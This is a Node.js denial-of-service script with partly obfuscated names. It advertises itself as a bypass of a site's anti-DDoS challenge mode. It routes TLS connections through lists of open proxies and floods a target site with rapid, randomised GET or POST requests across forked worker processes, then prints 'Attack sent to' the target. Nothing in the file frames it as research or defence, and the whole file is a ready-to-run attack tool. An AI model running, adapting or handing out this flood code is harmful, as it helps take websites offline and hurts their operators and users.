const net=require('net');
const fs=require('fs');
const url=require('url');
const request_2=require('request');
const{constants}=require('crypto');
var theJar=request_2.jar();
const path=require('path');
const http=require('http');
const tls=require('tls');
const execSync=require('child_process').execSync;
var VarsDefinetions={'Objetive':process.argv[4],'MethodRequest':process.argv[2],'time':process.argv[5],'process_count':process.argv[3],'rate':process.argv[6]};
try{
	var colors=require('colors');
}catch(_0x4bdd4a){
	console.log('@telephone_cn');
	execSync('npm install colors');
	execSync('npm install fs')
	execSync('npm install net')
	execSync('npm install url')
	execSync('npm install request')
	execSync('npm install crypto')
	execSync('npm install path')
	execSync('npm install http')
	execSync('npm install tls')
	execSync('npm install child_proess')
	console.log('Done Setup');
	process.exit();
}
var fileName=__filename;
var file=path.basename(fileName);
try{
	var proxies=fs.readFileSync('http.txt','utf-8').toString().replace(/\r/g,'').split('\n');
	var UAs=fs.readFileSync('ua.txt','utf-8').replace(/\r/g,'').split('\n');
}catch(_0x1af54f){
	if(_0x1af54f.code!=='ENOENT')throw _0x1af54f;
	console.log('UAM Bypass - old script but still good');
	console.log('node filename GET/POST {thead}{target}{time}{rate}');
	process.exit();
}
process.on('uncaughtException',function(){});
process.on('unhandledRejection',function(){});
require('events').EventEmitter.defaultMaxListeners=Infinity;
function getRandomNumberBetween(_0xebf78e,_0x2c81c7){
	return Math.floor(Math.random()*(_0x2c81c7-_0xebf78e+1)+_0xebf78e);
}
function RandomString(_0x5a7e3d){
	var _0x3d23c2='';
	var _0x111132='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
	var _0x27eaf0=_0x111132.length;
	for(var _0x348557=0;_0x348557<_0x5a7e3d;_0x348557++){
		_0x3d23c2+=_0x111132.charAt(Math.floor(Math.random()*_0x27eaf0));
	}
	return _0x3d23c2;
}
var parsed=url.parse(VarsDefinetions.Objetive);
process.setMaxListeners(15);
let browser_saves='';
const cluster=require('cluster');
const{cpus}=require('os');
const numCPUs=VarsDefinetions.process_count;
if(cluster.isPrimary){
	for(let i=0;i<numCPUs;i++){
		cluster.fork();
	}
	cluster.on('exit',(_0x3be8a1,_0x26aba0,_0x3cb6ef)=>{
		console.log('h pipa: '+_0x3be8a1.process.pid+' pai8ane');
	});
}else{
	function BuildRequest(){
		let _0x37f9d7=parsed.path;
		if(_0x37f9d7.indexOf('[rand]')!==-1){
			_0x37f9d7=_0x37f9d7.replace(/\[rand\]/g,RandomString(getRandomNumberBetween(5,16)));
		}
		var _0x1ac04d=VarsDefinetions.MethodRequest+' '+_0x37f9d7+' HTTP/1.2\r\nHost: '+parsed.host+'\r\nReferer: '+VarsDefinetions.Objetive+'\r\nOrigin: '+VarsDefinetions.Objetive+'\r\nAccept: */*\r\nuser-agent: '+UAs[Math.floor(Math.random()*UAs.length)]+'\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: *\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n';
		return _0x1ac04d;
	}
	setInterval(function(){
		var _0x26d695=getRandomNumberBetween(100,proxies.length-400);
		var _0x901b9a=proxies[Math.floor(Math.random()*_0x26d695)];
		_0x901b9a=_0x901b9a.split(':');
		const _0x2b5506=new http[('Agent')]({'keepAlive':true,'keepAliveMsecs':12500,'maxSockets':Infinity});
		var _0xeb42a9={};
		var _0x659bee=http.request({'host':_0x901b9a[0],'agent':_0x2b5506,'globalAgent':_0x2b5506,'port':_0x901b9a[1],'headers':{'Host':parsed.host,'Proxy-Connection':'Keep-Alive','Connection':'Keep-Alive'},'method':'CONNECT','path':parsed.host+':443'},function(){
			_0x659bee.setSocketKeepAlive(true);
		});
		_0x659bee.on('connect',function(_0x302d15,_0x59ce50,_0xd86f62){
			tls.authorized=true;
			tls.sync=true;
			var _0x5b0835=tls.connect({'ciphers':'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA','secureProtocol':['TLSv1_2_method','TLSv1_3_method','SSL_OP_NO_SSLv3','SSL_OP_NO_SSLv2'],'honorCipherOrder':true,'requestCert':true,'host':parsed.host,'port':443,'secureOptions':constants.SSL_OP_NO_SSLv3|constants.SSL_OP_NO_TLSv2,'servername':parsed.host,'secure':true,'rejectUnauthorized':false,'socket':_0x59ce50},function(){
				for(let _0x15cc8f=0;_0x15cc8f<VarsDefinetions.rate;_0x15cc8f++){
					_0x5b0835.setKeepAlive(true,17500);
					_0x5b0835.setTimeout(19500);
					var _0x3fbdeb=BuildRequest();
					_0x5b0835.write(_0x3fbdeb);
					_0x5b0835.write(VarsDefinetions.MethodRequest+' '+VarsDefinetions.Objetive+' HTTP/1.2\r\nHost: '+parsed.host+'\r\nReferer: '+VarsDefinetions.Objetive+'\r\nOrigin: '+VarsDefinetions.Objetive+'\r\nAccept: */*\r\nuser-agent: '+UAs[Math.floor(Math.random()*UAs.length)]+'\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: *\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: Keep-Alive\r\n\r\n');
				}
			});
			_0x5b0835.on('disconnected',()=>{
				_0x5b0835.destroy();
			});
			_0x5b0835.on('timeout',()=>{
				_0x5b0835.destroy();
			});
			_0x5b0835.on('error',_0x5bb10e=>{
				_0x5b0835.destroy();
			});
			_0x5b0835.on('data',_0x87514b=>{
				setTimeout(function(){
					_0x5b0835.abort();
					return delete _0x5b0835;
				},950000);
			});
			_0x5b0835.on('end',()=>{
				_0x5b0835.abort();
				_0x5b0835.destroy();
			});
		}).end();
	},0);
}
setTimeout(()=>{
	process.exit(1);
},VarsDefinetions.time*1000);
console.log('Attack sent to ：'+VarsDefinetions.Objetive+' Time：'+VarsDefinetions.time+' |hoangnayy');